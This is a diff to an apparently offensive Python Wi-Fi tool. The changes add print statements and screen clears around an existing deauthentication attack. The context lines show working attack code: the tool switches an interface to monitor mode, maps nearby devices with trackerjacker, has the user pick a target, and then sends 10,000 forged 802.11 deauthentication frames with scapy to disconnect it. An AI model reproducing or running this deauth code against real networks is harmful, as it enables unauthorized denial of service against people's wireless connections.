@@ -97,6 +97,7 @@ def deauth(brdmac, addr, interface):
     # print("\nChoose interface for deauth attack")
     # interface = chooseDevice()
     # goMonitorMode(interface)
+    print("Sending deauth packets")
     pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = addr, addr3 = addr) / Dot11Deauth()
     sendp(pkt, iface=interface, count=10000, inter=.2)
 
@@ -180,14 +181,20 @@ if __name__ == "__main__":
     addr = ap[1]
     # startAP(ssid, apDevice)
 
+    os.system("clear")
     print("\nChoose interface for Mac scanning")
     interface = chooseDevice()
     goMonitorMode(interface)
     os.system('trackerjacker -i ' + interface + ' --map')
+    os.system("clear")
 
     mac_list = printDevices(ssid)
     x = chooseAttDevice(mac_list)
 
-
+    os.system("clear")
+    print("----------------------")
+    print(x.bssid)
+    print("----------------------")
     deauth(x.bssid, addr, interface)
+    os.system("clear")
     stopAttack()
